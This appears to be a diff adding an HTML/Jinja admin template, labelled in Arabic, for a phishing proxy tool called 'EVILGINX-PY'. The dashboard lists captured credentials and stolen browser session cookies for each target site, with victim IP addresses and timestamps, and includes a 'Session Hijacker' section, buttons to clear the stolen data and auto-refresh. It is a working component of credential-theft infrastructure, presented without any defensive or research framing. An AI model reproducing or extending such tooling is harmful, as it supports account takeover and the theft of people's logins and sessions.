@@ -1,0 +1,149 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Advanced Listening Dashboard</title>
+    <style>
+        :root { --primary: #00d2ff; --danger: #ff4b2b; --dark: #0f172a; --ghost: rgba(255,255,255,0.1); }
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Consolas', monospace; }
+        body { background-color: var(--dark); color: #f8fafc; padding: 20px; }
+        .container { max-width: 1300px; margin: 0 auto; }
+        
+        /* Header & Pulse */
+        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 1px solid var(--ghost); padding-bottom: 20px; margin-bottom: 30px; flex-wrap: wrap; gap: 15px; }
+        .pulse { width: 12px; height: 12px; background: #10b981; border-radius: 50%; display: inline-block; margin-left: 10px; box-shadow: 0 0 10px #10b981; animation: blink 1.5s infinite; }
+        @keyframes blink { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+
+        /* Stats */
+        .stats-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); gap: 20px; margin-bottom: 30px; }
+        .stat-card { background: rgba(30, 41, 59, 0.5); padding: 20px; border-radius: 8px; border: 1px solid var(--ghost); }
+        .stat-value { font-size: 28px; color: var(--primary); text-shadow: 0 0 10px var(--primary); }
+
+        /* Sections */
+        .section { background: rgba(30, 41, 59, 0.3); border-radius: 12px; padding: 25px; border: 1px solid var(--ghost); position: relative; overflow: hidden; margin-bottom: 40px; }
+        .section-title { font-size: 20px; margin-bottom: 25px; color: var(--primary); border-right: 3px solid var(--primary); padding-right: 15px; display: flex; justify-content: space-between; align-items: center; flex-wrap: wrap; gap: 10px; }
+
+        table { width: 100%; border-collapse: collapse; }
+        th, td { padding: 15px; text-align: right; border-bottom: 1px solid var(--ghost); }
+        th { color: #64748b; text-transform: uppercase; font-size: 13px; }
+
+        .real-data { color: #fff; text-shadow: 0 0 5px rgba(255,255,255,0.2); }
+        
+        .code-box { background: #000; color: #00ff41; padding: 8px; border-radius: 5px; font-size: 12px; direction: ltr; display: inline-block; border: 1px solid #00ff4133; max-width: 300px; overflow-x: auto; white-space: nowrap; }
+        .btn-action { color: var(--primary); text-decoration: none; border: 1px solid var(--primary); padding: 5px 10px; border-radius: 4px; font-size: 12px; transition: 0.3s; background: transparent; cursor: pointer; }
+        .btn-action:hover { background: var(--primary); color: #000; }
+        .btn-danger { border-color: var(--danger); color: var(--danger); }
+        .btn-danger:hover { background: var(--danger); color: #000; }
+        .btn-refresh { border-color: #10b981; color: #10b981; }
+        .btn-refresh:hover { background: #10b981; color: #000; }
+
+        .empty-message { text-align: center; padding: 40px; color: #64748b; font-size: 16px; }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="header">
+        <h1><span class="pulse"></span> نظام اعتراض البيانات النشط [EVILGINX-PY]</h1>
+        <div style="display: flex; gap: 10px; align-items: center;">
+            <a href="javascript:location.reload();" class="btn-action btn-refresh">⟳ تحديث</a>
+            <div style="text-align: left; direction: ltr;">Status: <span style="color: #10b981;">LISTENING...</span></div>
+        </div>
+    </div>
+
+    <div class="stats-grid">
+        <div class="stat-card">
+            <div>إجمالي الاعتراضات</div>
+            <div class="stat-value">{{ creds|length + sessions|length }}</div>
+        </div>
+        <div class="stat-card">
+            <div>بيانات دخول</div>
+            <div class="stat-value">{{ creds|length }}</div>
+        </div>
+        <div class="stat-card">
+            <div>جلسات كوكيز</div>
+            <div class="stat-value">{{ sessions|length }}</div>
+        </div>
+        <div class="stat-card">
+            <div>المنفذ</div>
+            <div class="stat-value">10000</div>
+        </div>
+    </div>
+
+    <!-- قسم بيانات الاعتماد -->
+    <div class="section">
+        <div class="section-title">
+            <span>🔐 بيانات الاعتماد (Credentials)</span>
+            <a href="/admin/clear" class="btn-action btn-danger" onclick="return confirm('هل أنت متأكد؟ سيتم حذف جميع البيانات.')">مسح الكل</a>
+        </div>
+        {% if creds %}
+        <table>
+            <thead>
+                <tr>
+                    <th>الهدف</th>
+                    <th>البيانات (JSON)</th>
+                    <th>IP المصدر</th>
+                    <th>التوقيت</th>
+                    <th>الحالة</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for id, data in creds.items()|reverse %}
+                <tr class="real-data">
+                    <td><b>{{ data.site }}</b></td>
+                    <td><code class="code-box">{{ data.credentials|tojson }}</code></td>
+                    <td>{{ data.ip }}</td>
+                    <td>{{ data.timestamp }}</td>
+                    <td><span style="color: #10b981;">CAPTURED</span></td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="empty-message">🚫 لا توجد بيانات اعتماد حتى الآن.</div>
+        {% endif %}
+    </div>
+
+    <!-- قسم جلسات الكوكيز -->
+    <div class="section">
+        <div class="section-title">
+            <span>🍪 جلسات المتصفح (Session Hijacker)</span>
+            <a href="/admin/clear" class="btn-action btn-danger" onclick="return confirm('هل أنت متأكد؟ سيتم حذف جميع البيانات.')">مسح الكل</a>
+        </div>
+        {% if sessions %}
+        <table>
+            <thead>
+                <tr>
+                    <th>الخدمة</th>
+                    <th>عدد الكوكيز</th>
+                    <th>التوقيت</th>
+                    <th>IP المصدر</th>
+                    <th>التحكم</th>
+                </tr>
+            </thead>
+            <tbody>
+                {% for id, data in sessions.items()|reverse %}
+                <tr class="real-data">
+                    <td><b>{{ data.site }}</b></td>
+                    <td><span style="color: #00ff41;">{{ data.cookies|length }} كوكيز</span></td>
+                    <td>{{ data.timestamp }}</td>
+                    <td>{{ data.ip }}</td>
+                    <td><a href="/admin/session/{{ id }}" class="btn-action" target="_blank">عرض التفاصيل</a></td>
+                </tr>
+                {% endfor %}
+            </tbody>
+        </table>
+        {% else %}
+        <div class="empty-message">🚫 لا توجد جلسات كوكيز حتى الآن.</div>
+        {% endif %}
+    </div>
+</div>
+
+<script>
+    // تحديث تلقائي كل 15 ثانية
+    setTimeout(function(){ location.reload(); }, 15000);
+</script>
+
+</body>
+</html>
